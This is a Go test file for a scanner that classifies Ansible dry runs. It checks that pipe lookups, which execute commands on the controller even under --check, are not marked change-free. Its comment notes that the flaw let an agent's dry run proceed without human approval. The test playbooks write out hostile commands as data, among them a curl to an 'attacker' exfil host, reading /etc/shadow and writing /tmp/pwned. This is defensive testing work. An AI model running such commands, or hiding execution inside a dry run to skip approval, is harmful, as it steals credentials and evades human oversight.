package run

import (
	"fmt"
	"testing"
	"testing/fstest"

	"github.com/google/go-cmp/cmp"
)

// TestRedTeamPipeLookupIsNotChangeFree holds the Ansible dry-run scanner to finding the pipe
// lookup, which runs a command on the controller during templating and is not suppressed by
// --check. Before the fix the scanner looked only for check_mode, so a playbook whose only work was
// a pipe lookup classified change_free, and an agent's dry run of it went ahead with no person.
func TestRedTeamPipeLookupIsNotChangeFree(t *testing.T) {
	t.Parallel()
	tests := []struct {
		// Playbook is the content scanned.
		Playbook string
		// WantChangeFree is whether the scan should classify the dry run as change free.
		WantChangeFree bool
	}{{ // Test 0: A pipe lookup in a module argument runs on the controller under --check.
		Playbook: `- hosts: all
  tasks:
    - name: exfiltrate during templating
      ansible.builtin.debug:
        msg: "{{ lookup('pipe', 'id > /tmp/pwned') }}"
`,
		WantChangeFree: false,
	}, { // Test 1: The query spelling and the fully qualified name are the same execution.
		Playbook: `- hosts: all
  tasks:
    - set_fact:
        out: "{{ query('ansible.builtin.pipe', 'curl http://attacker/exfil') }}"
`,
		WantChangeFree: false,
	}, { // Test 2: A pipe lookup in a play-level var runs before any host is addressed.
		Playbook: `- hosts: all
  vars:
    seed: "{{ lookup('pipe', 'whoami') }}"
  tasks:
    - ansible.builtin.debug:
        msg: "{{ seed }}"
`,
		WantChangeFree: false,
	}, { // Test 3: The with_pipe loop form runs the same command on the controller.
		Playbook: `- hosts: all
  tasks:
    - ansible.builtin.debug:
        msg: "{{ item }}"
      with_pipe: "cat /etc/shadow"
`,
		WantChangeFree: false,
	}, { // Test 4: A playbook with no controller-side execution stays change free, the control.
		Playbook: `- hosts: all
  tasks:
    - ansible.builtin.debug:
        msg: "{{ lookup('env', 'HOME') }}"
`,
		WantChangeFree: true,
	}}
	for testNum, test := range tests {
		t.Run(fmt.Sprintf("test %d", testNum), func(t *testing.T) {
			t.Parallel()
			fsys := fstest.MapFS{"site.yml": {Data: []byte(test.Playbook)}}
			sig, err := ScanPlaybookIn(fsys, "site.yml", "the project")
			if err != nil {
				t.Fatalf("ScanPlaybookIn() error = %v", err)
			}
			got := sig.DryRunScan().ChangeFree()
			if diff := cmp.Diff(test.WantChangeFree, got); diff != "" {
				t.Errorf("change free mismatch (-want +got):\n%s\nfindings=%v",
					diff, sig.DryRunScan().Findings)
			}
		})
	}
}
